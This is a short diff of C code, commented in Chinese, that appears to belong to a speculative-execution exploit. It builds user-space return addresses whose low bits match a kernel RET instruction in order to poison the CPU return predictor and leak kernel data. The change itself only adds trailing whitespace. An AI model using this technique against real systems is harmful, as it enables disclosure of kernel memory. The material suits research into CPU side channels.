@@ -68,7 +68,7 @@ int main(int argc, char *argv[])
     // 泄密gadget地址
     ret_path[0] = (u8*)sg.kbr_dst;
     for (int i = 0; i < RET_PATH_LENGTH; ++i) {
-        // “伪造与内核 RET 源地址相同低位的返回历史”，用来污染 CPU 的返回预测器（RSB / BHB）
+        // “伪造与内核 RET 源地址相同低位的返回历史”，用来污染 CPU 的返回预测器（RSB / BHB）    
         // 取内核中真实 RET 指令地址的“低位模式”
         // 构造出一个 用户态地址，其低位和 kernel RET 完全一致。
         ret_path[i+1] = train_space + (sg.kbr_src & HISTORY_MASK);
